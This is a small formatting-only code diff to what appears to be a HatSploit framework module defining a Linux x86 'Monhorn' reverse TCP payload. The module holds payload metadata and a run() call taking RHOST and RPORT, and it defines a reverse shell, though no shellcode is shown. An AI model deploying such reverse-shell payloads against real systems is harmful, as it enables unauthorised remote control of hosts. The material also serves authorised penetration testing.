@@ -15,15 +15,13 @@ class HatSploitPayload(Payload, Monhorn):
     details = {
         'Name': "Linux x86 Monhorn Reverse TCP",
         'Payload': "linux/x86/monhorn_reverse_tcp",
-        'Authors': [
-            'Ivan Nikolsky (enty8080) - payload developer'
-        ],
+        'Authors': ['Ivan Nikolsky (enty8080) - payload developer'],
         'Description': "Monhorn reverse TCP payload for Linux x86.",
         'Architecture': "x86",
         'Platform': "linux",
         'Session': MonhornSession,
         'Rank': "high",
-        'Type': "reverse_tcp"
+        'Type': "reverse_tcp",
     }
 
     def run(self):
@@ -31,5 +29,5 @@ class HatSploitPayload(Payload, Monhorn):
             self.details['Platform'],
             self.details['Architecture'],
             self.handler['RHOST'],
-            self.handler['RPORT']
+            self.handler['RPORT'],
         )
